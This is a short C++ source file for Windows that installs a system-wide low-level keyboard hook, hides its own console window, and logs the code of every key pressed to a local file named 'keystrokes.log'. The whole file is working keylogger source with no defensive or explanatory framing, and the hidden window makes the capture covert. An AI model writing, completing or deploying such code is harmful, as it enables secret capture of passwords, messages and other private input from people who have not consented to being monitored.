#include <iostream>
#include <Windows.h>
#include "../include/logger.h"

// Global instance of the logger
Logger logger("keystrokes.log");

// The hook procedure that will handle keyboard events
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT* pKBDllHookStruct = (KBDLLHOOKSTRUCT*)lParam;
        DWORD key = pKBDllHookStruct->vkCode;

        // Check if the key is pressed down (WM_KEYDOWN)
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            // Log the key pressed (convert the key code to string)
            logger.logKey(std::to_string(key));
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main() {
    // Hide the console window
    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, SW_HIDE);

    // Set up the keyboard hook
    HHOOK hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if (hHook == NULL) {
        std::cerr << "Error setting up keyboard hook!" << std::endl;
        return 1;
    }

    // Run a message loop to keep the hook active
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) != 0) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Clean up and remove the hook
    UnhookWindowsHookEx(hHook);
    return 0;
}
